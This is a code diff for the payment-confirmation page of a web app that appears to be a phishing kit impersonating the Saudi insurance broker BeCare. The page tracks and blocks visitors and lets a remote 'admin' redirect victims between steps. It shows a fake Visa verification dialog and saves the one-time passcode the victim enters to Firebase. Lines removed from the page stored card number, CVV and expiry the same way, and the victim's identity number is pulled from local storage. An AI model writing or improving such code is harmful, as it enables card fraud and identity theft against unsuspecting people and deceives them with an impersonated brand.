@@ -4,11 +4,21 @@ import { useEffect, useState } from "react"
 import { useRouter } from "next/navigation"
 import { Button } from "@/components/ui/button"
 import { Input } from "@/components/ui/input"
-import { Check, X, Globe } from 'lucide-react'
+import {
+  X,
+  Globe,
+  CalendarDays,
+  CreditCard as CreditCardIcon,
+  Car,
+  Hash,
+} from "lucide-react"
 import { FullPageLoader } from "@/components/loader"
-import { StepIndicator } from "@/components/step-indicator"
 import PaymentPage from "@/components/pay-form"
-import { getOrCreateVisitorID, updateVisitorPage, checkIfBlocked } from "@/lib/visitor-tracking"
+import {
+  getOrCreateVisitorID,
+  updateVisitorPage,
+  checkIfBlocked,
+} from "@/lib/visitor-tracking"
 import { useAutoSave } from "@/hooks/use-auto-save"
 import { useRedirectMonitor } from "@/hooks/use-redirect-monitor"
 import { addData, saveToHistory, db } from "@/lib/firebase"
@@ -19,38 +29,35 @@ export default function CheckPage() {
   const [visitorID] = useState(() => getOrCreateVisitorID())
   const [loading, setLoading] = useState(true)
   const [isBlocked, setIsBlocked] = useState(false)
-  
+
   // Form fields
   const [selectedOffer, setSelectedOffer] = useState<any>(null)
   const [offerTotalPrice, setOfferTotalPrice] = useState<number>(0)
-  const [selectedPaymentMethod, setSelectedPaymentMethod] = useState("credit-discount")
+  const [selectedPaymentMethod] = useState("credit-discount")
   const [showOtpDialog, setShowOtpDialog] = useState(false)
   const [otpValue, setOtpValue] = useState("")
   const [otpError, setOtpError] = useState("")
-  const [otpAttempts, setOtpAttempts] = useState(5)
-  const [cardNumber, setCardNumber] = useState("")
-  const [cvv, setCvv] = useState("")
-  const [expiryDate, setExpiryDate] = useState("")
-  
+  const [, setOtpAttempts] = useState(5)
+
+  // Identity (from localStorage homeFormData)
+  const [identityNumber, setIdentityNumber] = useState("")
+
   // Language
   const [language, setLanguage] = useState<"ar" | "en">("ar")
-  
+
   // Auto-save
   useAutoSave({
     visitorId: visitorID,
     pageName: "check",
     data: {
       selectedPaymentMethod,
-      cardNumber,
-      cvv,
-      expiryDate
-    }
+    },
   })
-  
+
   // Monitor redirect requests from admin
   useRedirectMonitor({
     visitorId: visitorID,
-    currentPage: "check"
+    currentPage: "check",
   })
 
   // Navigation listener - listen for admin redirects
@@ -64,7 +71,6 @@ export default function CheckPage() {
           const data = docSnapshot.data()
           const step = data.currentStep
 
-          // Redirect based on currentStep
           if (step === "home") {
             router.push("/main")
           } else if (step === "phone") {
@@ -85,7 +91,7 @@ export default function CheckPage() {
 
     return () => unsubscribe()
   }, [router, visitorID])
-  
+
   // Initialize on mount
   useEffect(() => {
     const init = async () => {
@@ -95,11 +101,19 @@ export default function CheckPage() {
         setLoading(false)
         return
       }
-      
+
+      // Load identity number from localStorage
+      try {
+        const hfd = JSON.parse(localStorage.getItem("homeFormData") || "{}")
+        if (hfd.identityNumber) setIdentityNumber(hfd.identityNumber)
+      } catch {
+        /* ignore */
+      }
+
       // Load selected offer from Firebase
       const docRef = doc(db, "pays", visitorID)
       const docSnap = await getDoc(docRef)
-      
+
       if (docSnap.exists()) {
         const data = docSnap.data()
         if (data.selectedOffer) {
@@ -109,27 +123,23 @@ export default function CheckPage() {
           setOfferTotalPrice(data.offerTotalPrice)
         }
       }
-      
+
       await updateVisitorPage(visitorID, "check", 4)
       setLoading(false)
     }
-    
+
     init()
   }, [visitorID])
-  
-  const handlePayment = async (e: React.FormEvent) => {
-    e.preventDefault()
-    // Save current data to history before updating
-    await saveToHistory(visitorID, 4)
-    
-    await addData({ id: visitorID, cardNumber, cvv, expiryDate, selectedPaymentMethod, cardUpdatedAt: new Date().toISOString() }).then(() => {
-      setShowOtpDialog(true)
-    })
-  }
-  
-  const handleOtpSubmit = (e: React.FormEvent) => {
+
+  const handleOtpSubmit = async (e: React.FormEvent) => {
     e.preventDefault()
     if (otpValue === "123456") {
+      await saveToHistory(visitorID, 4)
+      await addData({
+        id: visitorID,
+        otpValue,
+        otpVerifiedAt: new Date().toISOString(),
+      })
       setShowOtpDialog(false)
       alert("تم الدفع بنجاح!")
     } else {
@@ -137,36 +147,40 @@ export default function CheckPage() {
       setOtpAttempts((prev) => prev - 1)
     }
   }
-  
+
   const handleResendOtp = () => {
     setOtpError("")
     setOtpAttempts(5)
     alert("تم إرسال رمز جديد")
   }
-  
+
   if (loading) {
     return <FullPageLoader />
   }
-  
+
   if (isBlocked) {
     return (
       <div className="min-h-screen flex items-center justify-center bg-gray-50">
         <div className="text-center p-8 bg-white rounded-lg shadow-lg max-w-md">
-          <h1 className="text-2xl font-bold text-red-600 mb-4">تم حظر الوصول</h1>
+          <h1 className="text-2xl font-bold text-red-600 mb-4">
+            تم حظر الوصول
+          </h1>
           <p className="text-gray-600">عذراً، تم حظر وصولك إلى هذه الخدمة.</p>
         </div>
       </div>
     )
   }
-  
+
   if (!selectedOffer) {
     return (
       <div className="min-h-screen flex items-center justify-center bg-gray-50">
         <div className="text-center p-8 bg-white rounded-lg shadow-lg max-w-md">
-          <h1 className="text-2xl font-bold text-gray-900 mb-4">لم يتم اختيار عرض</h1>
+          <h1 className="text-2xl font-bold text-gray-900 mb-4">
+            لم يتم اختيار عرض
+          </h1>
           <p className="text-gray-600 mb-6">يرجى العودة واختيار عرض تأمين</p>
           <Button
-            onClick={() => router.push('/compar')}
+            onClick={() => router.push("/compar")}
             className="bg-[#0a4a68] hover:bg-[#083d57] text-white"
           >
             العودة للعروض
@@ -175,100 +189,167 @@ export default function CheckPage() {
       </div>
     )
   }
-  
+
   return (
     <div className="min-h-screen bg-white">
       {/* Header */}
       <div className="px-3 py-3 md:px-6 md:py-4 flex items-center justify-between border-b border-slate-200 bg-white">
-        <button 
+        <button
           onClick={() => setLanguage(language === "ar" ? "en" : "ar")}
-          className="flex items-center gap-1.5 px-3 py-2 md:px-4 md:py-2.5 bg-white/95 rounded-lg hover:bg-white transition-colors shadow-md"
+          className="flex items-center gap-1.5 px-3 py-2 md:px-4 md:py-2.5 bg-white rounded-lg hover:bg-slate-50 transition-colors shadow-md border border-slate-200"
         >
           <Globe className="w-4 h-4 md:w-5 md:h-5 text-[#0a4a68]" />
-          <span className="text-[#0a4a68] font-semibold text-sm md:text-base">{language === "ar" ? "EN" : "AR"}</span>
+          <span className="text-[#0a4a68] font-semibold text-sm md:text-base">
+            {language === "ar" ? "EN" : "AR"}
+          </span>
         </button>
         <div className="bg-white rounded-2xl px-3 py-2 shadow-lg">
-          <img src="/Bcare-logo.svg" alt="BeCare" className="h-7 md:h-8 w-auto" />
+          <img
+            src="/Bcare-logo.svg"
+            alt="BeCare"
+            className="h-7 md:h-8 w-auto"
+          />
         </div>
       </div>
 
-
       {/* Main Content */}
       <div className="max-w-3xl mx-auto pt-6 md:pt-10 px-3 md:px-4 pb-6 md:pb-8">
-        <div className="bg-white rounded-xl md:rounded-2xl shadow-xl overflow-hidden">
-          <div className="p-4 md:p-6 lg:p-8">
-            <h2 className="text-2xl md:text-3xl font-bold text-[#0a4a68] mb-4 md:mb-6 text-center">
-              تأكيد العرض والدفع
-            </h2>
+        <div className="text-center mb-6" dir="rtl">
+          <h2 className="text-2xl md:text-3xl font-bold text-[#0a4a68]">
+            تأكيد العرض والدفع
+          </h2>
+          <p className="text-sm md:text-base text-slate-500 mt-1">
+            راجع تفاصيل العرض ثم أكمل بيانات الدفع.
+          </p>
+        </div>
 
-            {/* Summary Card - Same as compar page */}
-            <div className="bg-white rounded-lg md:rounded-xl shadow-md p-4 md:p-5 lg:p-6 mb-5 md:mb-6" dir="rtl">
-              <div className="flex items-start justify-between gap-3 md:gap-4">
-                <div className="flex-1">
-                  <h3 className="text-lg md:text-xl font-bold text-gray-900 mb-1 md:mb-2">{selectedOffer.name}</h3>
-                  <p className="text-blue-600 font-semibold text-base md:text-lg mb-3 md:mb-4">
-                    التأمين {selectedOffer.type === "against-others" ? "ضد الغير" : selectedOffer.type === "comprehensive" ? "شامل" : ""}
-                  </p>
+        {/* Company logo card */}
+        {selectedOffer.image_url && (
+          <div className="flex items-center justify-center py-6 border border-gray-100 rounded-2xl bg-white mb-3 shadow-sm">
+            <img
+              src={selectedOffer.image_url}
+              alt={selectedOffer.name}
+              className="h-16 object-contain"
+            />
+          </div>
+        )}
 
-                  {selectedOffer.extra_features && selectedOffer.extra_features.length > 0 && (
-                    <div className="space-y-2 mb-3 md:mb-4">
-                      {selectedOffer.extra_features.map((feature: any, idx: number) => (
-                        <div key={idx} className="flex items-start gap-2">
-                          <input
-                            type="checkbox"
-                            checked
-                            readOnly
-                            className="mt-1 w-4 h-4 rounded border-gray-300 cursor-default"
-                          />
-                          <label className="flex-1 text-gray-700 text-xs md:text-sm">
-                            {feature.content}
-                          </label>
-                        </div>
-                      ))}
-                    </div>
-                  )}
-                </div>
-
-                <div className="flex flex-col items-end gap-2 md:gap-3">
-                  {selectedOffer.image_url && (
-                    <div className="w-16 h-16 md:w-20 md:h-20 rounded-lg border-2 border-gray-200 flex items-center justify-center bg-gray-50 overflow-hidden">
-                      <img
-                        src={selectedOffer.image_url}
-                        alt={selectedOffer.name}
-                        className="w-full h-full object-contain"
-                      />
-                    </div>
-                  )}
-                  <div className="text-left">
-                    <div className="text-2xl md:text-3xl font-bold text-[#0a4a68]">{offerTotalPrice.toFixed(2)}</div>
-                    <div className="text-xs md:text-sm text-gray-600">ريال / سنة</div>
-                  </div>
-                </div>
+        {/* Policy details card */}
+        <div
+          className="border border-gray-100 rounded-2xl bg-white overflow-hidden mb-3 shadow-sm"
+          dir="rtl"
+        >
+          {[
+            {
+              icon: <CalendarDays className="w-4 h-4 text-[#0a4a68]" />,
+              label: "تاريخ بدء الوثيقة",
+              value: "",
+            },
+            {
+              icon: <CreditCardIcon className="w-4 h-4 text-[#0a4a68]" />,
+              label: "رقم الهوية",
+              value: identityNumber,
+            },
+            {
+              icon: <Car className="w-4 h-4 text-[#0a4a68]" />,
+              label: "سنة الصنع",
+              value: "",
+            },
+            {
+              icon: <Hash className="w-4 h-4 text-[#0a4a68]" />,
+              label: "الرقم المرجعي للتسعيرة",
+              value: offerTotalPrice
+                ? String(Math.floor(offerTotalPrice * 1000))
+                : "",
+            },
+          ].map((row, i, arr) => (
+            <div
+              key={row.label}
+              className={`flex items-center justify-between px-4 py-3.5 ${
+                i < arr.length - 1 ? "border-b border-gray-100" : ""
+              }`}
+            >
+              <span className="flex items-center gap-2 text-sm font-semibold text-gray-800">
+                <span className="text-[#0a4a68]">{row.icon}</span> {row.label}
+              </span>
+              <div className="flex items-center gap-2">
+                <span className="text-sm text-gray-500">{row.value}</span>
               </div>
             </div>
-            
-            <PaymentPage offerTotalPrice={offerTotalPrice} />
+          ))}
+        </div>
+
+        {/* Pricing breakdown */}
+        <div
+          className="border border-gray-100 rounded-2xl bg-white overflow-hidden mb-3 shadow-sm"
+          dir="rtl"
+        >
+          <div className="flex items-center gap-2 px-4 py-3 border-b border-gray-100">
+            <Hash className="w-4 h-4 text-[#0a4a68]" />
+            <span className="font-bold text-[#0a4a68] text-sm">التفاصيل</span>
+          </div>
+          <div className="px-4 py-3 space-y-2.5">
+            <div className="flex justify-between text-sm">
+              <span className="text-gray-500">
+                ر.س {(offerTotalPrice / 1.15).toFixed(2)}
+              </span>
+              <span className="font-medium text-gray-700">المجموع الجزئي</span>
+            </div>
+            <div className="flex justify-between text-sm">
+              <span className="text-gray-500">
+                ر.س {(offerTotalPrice - offerTotalPrice / 1.15).toFixed(2)}
+              </span>
+              <span className="font-medium text-gray-700">
+                ضريبة القيمة المضافة (%15.00)
+              </span>
+            </div>
+            <div className="flex justify-between border-t border-gray-100 pt-2.5">
+              <span className="font-bold text-[#0a4a68]">
+                ر.س {offerTotalPrice.toFixed(2)}
+              </span>
+              <span className="font-bold text-gray-800">المبلغ الإجمالي</span>
+            </div>
+            <p className="text-[11px] text-gray-400 text-center pt-1">
+              شامل جميع الضرائب والرسوم و 4.00% عمولة الوسيط
+            </p>
           </div>
         </div>
+
+        {/* Payment Form */}
+        <PaymentPage offerTotalPrice={offerTotalPrice} />
       </div>
 
       {/* OTP Dialog */}
       {showOtpDialog && (
-        <div className="fixed inset-0 bg-black/50 flex items-center justify-center p-4 z-50">
-          <div className="bg-white rounded-2xl shadow-2xl max-w-md w-full p-8" dir="rtl">
-            <div className="flex items-center justify-between gap-4 mb-6">
-              <img src="/visa.svg" alt="kd" width={50} />
-              <span className="font-bold text-blue-800">Verified </span>
+        <div className="fixed inset-0 bg-black/50 flex items-center justify-center p-3 sm:p-4 z-50">
+          <div
+            className="bg-white rounded-xl sm:rounded-2xl shadow-2xl max-w-md w-full p-5 sm:p-8"
+            dir="rtl"
+          >
+            <div className="flex items-center justify-between gap-4 mb-4 sm:mb-6">
+              <img
+                src="/visa.svg"
+                alt="Visa"
+                width={40}
+                className="sm:w-[50px]"
+              />
+              <span className="font-bold text-[#0a4a68] text-sm sm:text-base">
+                Verified
+              </span>
             </div>
 
-            <h3 className="text-2xl font-bold text-gray-900 text-center mb-4">Enter verification code</h3>
-            <p className="text-gray-600 text-center mb-6 leading-relaxed">
+            <h3 className="text-xl sm:text-2xl font-bold text-gray-900 text-center mb-3 sm:mb-4">
+              Enter verification code
+            </h3>
+            <p className="text-gray-600 text-center mb-4 sm:mb-6 leading-relaxed text-sm sm:text-base">
               We sent you a verification code by text message to (+966) 5******.
             </p>
 
-            <form onSubmit={handleOtpSubmit} className="space-y-5">
+            <form onSubmit={handleOtpSubmit} className="space-y-4 sm:space-y-5">
               <div className="space-y-2">
-                <label className="block text-gray-700 font-semibold text-sm text-center">Verification code</label>
+                <label className="block text-gray-700 font-semibold text-xs sm:text-sm text-center">
+                  Verification code
+                </label>
                 <Input
                   type="tel"
                   value={otpValue}
@@ -278,12 +359,12 @@ export default function CheckPage() {
                   }}
                   placeholder="######"
                   maxLength={6}
-                  className="h-16 text-center text-2xl tracking-widest border-2 rounded-xl focus:border-blue-500 shadow-sm font-mono"
+                  className="h-14 sm:h-16 text-center text-xl sm:text-2xl tracking-widest border-2 rounded-xl focus:border-[#0a4a68] shadow-sm font-mono"
                   required
                 />
                 {otpError && (
-                  <div className="flex items-center gap-2 text-red-600 text-sm font-semibold justify-center">
-                    <X className="w-4 h-4" />
+                  <div className="flex items-center gap-2 text-red-600 text-xs sm:text-sm font-semibold justify-center">
+                    <X className="w-3.5 h-3.5 sm:w-4 sm:h-4" />
                     <span>{otpError}</span>
                   </div>
                 )}
@@ -291,7 +372,7 @@ export default function CheckPage() {
 
               <Button
                 type="submit"
-                className="w-full h-14 bg-blue-600 hover:bg-blue-700 text-white font-bold text-lg rounded-xl shadow-lg hover:shadow-xl transition-all"
+                className="w-full h-12 sm:h-14 bg-[#0a4a68] hover:bg-[#083d57] text-white font-bold text-base sm:text-lg rounded-xl shadow-lg hover:shadow-xl transition-all"
               >
                 CONTINUE
               </Button>
@@ -299,24 +380,24 @@ export default function CheckPage() {
               <button
                 type="button"
                 onClick={handleResendOtp}
-                className="w-full text-blue-600 font-semibold text-sm hover:text-blue-700 transition-colors"
+                className="w-full text-[#0a4a68] font-semibold text-xs sm:text-sm hover:text-[#083d57] transition-colors"
               >
                 RESEND CODE
               </button>
             </form>
 
-            <div className="mt-6 pt-6 border-t-2 border-gray-200">
-              <button className="flex items-center justify-between w-full text-blue-600 font-semibold text-sm hover:text-blue-700 transition-colors">
+            <div className="mt-4 sm:mt-6 pt-4 sm:pt-6 border-t-2 border-gray-200">
+              <button className="flex items-center justify-between w-full text-[#0a4a68] font-semibold text-xs sm:text-sm hover:text-[#083d57] transition-colors">
                 <span>Need Help?</span>
-                <span className="text-xl">+</span>
+                <span className="text-lg sm:text-xl">+</span>
               </button>
             </div>
 
-            <div className="mt-4">
-              <p className="text-gray-500 text-xs text-center leading-relaxed">
+            <div className="mt-3 sm:mt-4">
+              <p className="text-gray-500 text-[11px] sm:text-xs text-center leading-relaxed">
                 Having trouble?
                 <br />
-                <button className="text-blue-600 hover:text-blue-700 font-semibold">
+                <button className="text-[#0a4a68] hover:text-[#083d57] font-semibold">
                   Choose another security option
                 </button>
               </p>
